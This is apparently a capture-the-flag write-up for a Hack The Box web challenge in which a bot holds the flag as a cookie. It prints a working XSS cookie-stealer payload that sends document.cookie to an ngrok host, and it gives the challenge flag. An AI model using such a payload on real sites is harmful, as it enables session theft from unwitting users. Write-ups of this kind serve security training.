![image](https://user-images.githubusercontent.com/80063008/144764849-fc409f2a-bb96-454c-b08c-2564c1a7edd7.png)


According to the index.js in challenges/routes, we can do a POST request on /api/submit with a query in the body.

![image](https://user-images.githubusercontent.com/80063008/144764914-7cb584f9-4a76-47d3-b59c-4dbee8e1968c.png)


I did so and I get the message that it was successful.

![image](https://user-images.githubusercontent.com/80063008/144764868-64267912-6d59-4ee8-bad6-27dffeb2d946.png)


The website looks like this:

![image](https://user-images.githubusercontent.com/80063008/144764871-04b74273-507a-4cc6-b341-ea9e462b6d01.png)


Clicking on the back of the elves, makes a window pop-up where we can send the post request mentioned in the source code:

![image](https://user-images.githubusercontent.com/80063008/144764874-fb07cbcd-f99c-47f2-95b7-61f2d48d608d.png)


The bot.js file source code looks like this: It seems to be accessing the queries page which is where we send our post request message and he has a cookie which is the flag itself.

![image](https://user-images.githubusercontent.com/80063008/144764886-5fe6e139-a7fa-427b-bc51-0a66bf180089.png)


We can't go to the queries page because only localhost can do that.

![image](https://user-images.githubusercontent.com/80063008/144764901-068ff5de-ac1e-48cb-9e34-e8d93633892c.png)


I disabled that filter on my local instance so that I can see the output of our messages. Tried XSS and saw that it is triggered. Using the syntax below, we were able to get our fake flag after setting up a http python server and ngrok. Basically I was able to steal the cookie via xss.

![image](https://user-images.githubusercontent.com/80063008/144764953-4127bbc0-561b-4cc7-a115-8eacecc3def0.png)

XSS Cookie Stealer payload:

```javascript
<script type="text/javascript">document.location="http://a417-2a02-2f0e-de00-fa00-b2bc-3b79-670f-3c60.ngrok.io/?c="+document.cookie;</script>
```

Re-ran the same syntax on the remote instance and got the legit flag. I didn't need to bypass the localhost filter at all.
![image](https://user-images.githubusercontent.com/80063008/144764957-5d3beb2f-2c47-4e15-a459-4b224b88204f.png)


HTB{3v1l_3lv3s_4r3_r1s1ng_up!}

